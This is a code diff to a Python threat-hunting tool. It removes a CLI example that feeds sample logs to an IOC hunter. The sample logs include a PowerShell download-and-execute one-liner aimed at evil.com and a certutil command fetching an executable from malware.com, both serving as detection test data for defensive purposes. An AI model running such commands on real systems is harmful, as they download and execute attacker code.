@@ -659,23 +659,3 @@ class ThreatHunter:
         
         return recommendations
 
-
-# CLI usage example
-if __name__ == "__main__":
-    import sys
-    
-    hunter = ThreatHunter()
-    
-    # Example: Hunt for IOCs in logs
-    sample_logs = [
-        "2025-12-17 10:30:00 powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell')",
-        "2025-12-17 10:31:00 certutil -urlcache -f http://malware.com/tool.exe c:\\temp\\tool.exe",
-        "2025-12-17 10:32:00 Failed password for admin from 10.0.0.50",
-        "2025-12-17 10:33:00 Failed password for admin from 10.0.0.50",
-    ]
-    
-    data_source = {"type": "logs", "data": sample_logs}
-    
-    iocs = asyncio.run(hunter.hunt_iocs(data_source))
-    
-    print(json.dumps([asdict(ioc) for ioc in iocs], indent=2))
